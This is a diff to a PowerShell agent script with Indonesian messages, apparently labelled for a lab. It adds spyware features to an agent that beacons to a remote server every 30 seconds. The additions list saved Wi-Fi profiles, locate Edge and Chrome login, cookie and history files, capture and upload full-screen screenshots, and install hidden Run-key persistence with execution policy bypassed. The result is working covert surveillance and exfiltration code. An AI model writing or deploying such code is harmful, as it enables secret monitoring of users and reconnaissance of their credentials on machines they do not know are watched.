@@ -4,6 +4,9 @@ $MachineID = "win-lab-1"
 $IntervalSec = 30
 $Endpoint = "http://" + $ServerIP + ":" + $ServerPort + "/"
 
+$Install = $args -contains "-Install"
+$AgentPath = Join-Path $env:APPDATA "LabAgent\agent_windows.ps1"
+
 function Get-SystemReport {
     $out = New-Object System.Text.StringBuilder
 
@@ -107,6 +110,40 @@ function Get-SystemReport {
         [void]$out.AppendLine("(tidak bisa membaca koneksi: $($_.Exception.Message))")
     }
 
+    [void]$out.AppendLine("=== WIFI PROFILES TERSIMPAN ===")
+    try {
+        $raw = netsh wlan show profiles
+        $raw | Select-String "All User Profile|Profil Semua Pengguna" | ForEach-Object {
+            $ssid = ($_ -split ":", 2)[1].Trim()
+            if ($ssid) { [void]$out.AppendLine("SSID : $ssid") }
+        }
+    } catch {
+        [void]$out.AppendLine("(gagal baca wifi: $($_.Exception.Message))")
+    }
+
+    [void]$out.AppendLine("=== DATA BROWSER (Edge/Chrome) ===")
+    try {
+        $paths = @(
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+        )
+        foreach ($bp in $paths) {
+            if (Test-Path $bp) {
+                $short = $bp.Substring($env:LOCALAPPDATA.Length + 1)
+                [void]$out.AppendLine("-- $short --")
+                foreach ($f in @("History", "Login Data", "Cookies", "Preferences")) {
+                    $fp = Join-Path $bp $f
+                    if (Test-Path $fp) {
+                        $i = Get-Item $fp
+                        [void]$out.AppendLine("$f | $([math]::Round($i.Length/1KB,1)) KB | terakhir $($i.LastWriteTime.ToString('yyyy-MM-dd HH:mm'))")
+                    }
+                }
+            }
+        }
+    } catch {
+        [void]$out.AppendLine("(gagal baca browser: $($_.Exception.Message))")
+    }
+
     [void]$out.AppendLine("=== FILE USER ===")
     try {
         $targets = @(
@@ -145,6 +182,38 @@ function Get-SystemReport {
     return $out.ToString()
 }
 
+function Get-ScreenshotB64 {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+        $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size)
+        $ms = New-Object System.IO.MemoryStream
+        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+        $b64 = [Convert]::ToBase64String($ms.ToArray())
+        $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
+        return $b64
+    } catch {
+        return $null
+    }
+}
+
+if ($Install) {
+    try {
+        $dir = Split-Path $AgentPath -Parent
+        New-Item -ItemType Directory -Path $dir -Force | Out-Null
+        Copy-Item $PSCommandPath $AgentPath -Force
+        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$AgentPath`""
+        Set-ItemProperty -Path $runKey -Name "LabAgent" -Value $cmd
+        Write-Host "[+] Persistence terpasang: $runKey\LabAgent"
+        Write-Host "[+] Skrip disalin ke: $AgentPath"
+    } catch {
+        Write-Host "[!] Gagal pasang persistence: $($_.Exception.Message)"
+    }
+}
+
 function Send-Report {
     $report = Get-SystemReport
     try {
@@ -152,13 +221,25 @@ function Send-Report {
         $wc.Proxy = $null
         $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
         $resp = $wc.UploadString($Endpoint + "?id=" + $MachineID, "data=" + [uri]::EscapeDataString($report))
-        Write-Host "[+] Terkirim $($resp) at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        Write-Host "[+] Laporan terkirim $resp at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     } catch {
         Write-Host "[!] Server tidak terjangkau at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $($_.Exception.Message)"
     }
+    $shot = Get-ScreenshotB64
+    if ($shot) {
+        try {
+            $wc2 = New-Object System.Net.WebClient
+            $wc2.Proxy = $null
+            $wc2.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+            $resp = $wc2.UploadString($Endpoint, "type=screenshot&data=" + [uri]::EscapeDataString($shot))
+            Write-Host "[+] Screenshot terkirim $resp"
+        } catch {
+            Write-Host "[!] Screenshot gagal: $($_.Exception.Message)"
+        }
+    }
 }
 
-Write-Host "[*] Agent dimulai. Kirim laporan ke $Endpoint setiap ${IntervalSec}s (Ctrl+C untuk stop)"
+Write-Host "[*] Agent dimulai. Kirim laporan + screenshot ke $Endpoint setiap ${IntervalSec}s (Ctrl+C untuk stop)"
 $sentOnce = $false
 while ($true) {
     if (-not $sentOnce) {
